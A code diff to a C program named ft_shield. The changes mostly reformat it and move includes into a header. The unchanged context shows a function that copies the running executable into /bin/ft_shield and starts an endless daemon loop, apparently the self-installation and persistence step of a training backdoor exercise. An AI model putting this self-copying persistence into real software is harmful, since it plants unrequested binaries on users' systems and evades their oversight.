@@ -1,15 +1,6 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <string.h>
-#include <syslog.h>
+#include "ft_shield.h"
 
-#define BIN_PATH "/bin/ft_shield"
-#define EXE_PATH "/home/s/sh/a.out"
-
-
-void	server()
+void server()
 {
 	while (1)
 	{
@@ -19,12 +10,12 @@ void	server()
 	syslog(LOG_INFO, "loop exited\n");
 }
 
-int	egg_plant(char *exec_path)
+int egg_plant(char *exec_path)
 {
-	int	bin; // file descriptor of /bin/ft_shield
-	int	usr; // file descriptor of program that user ran
-	int	ret;
-	char	buffer[1024];
+	int bin; // file descriptor of /bin/ft_shield
+	int usr; // file descriptor of program that user ran
+	int ret;
+	char buffer[1024];
 
 	bin = open(BIN_PATH, O_CREAT | O_WRONLY | O_TRUNC, 755);
 	if (bin < 0)
@@ -44,10 +35,10 @@ int	egg_plant(char *exec_path)
 	return (0);
 }
 
-int	main(int argc, char **argv)
+int main(int argc, char **argv)
 {
-	int	len;
-	char	exec_path[256];
+	int len;
+	char exec_path[256];
 
 	syslog(LOG_INFO, "this is first line of main\n");
 	openlog("ft_shield", LOG_PID | LOG_CONS, LOG_USER);
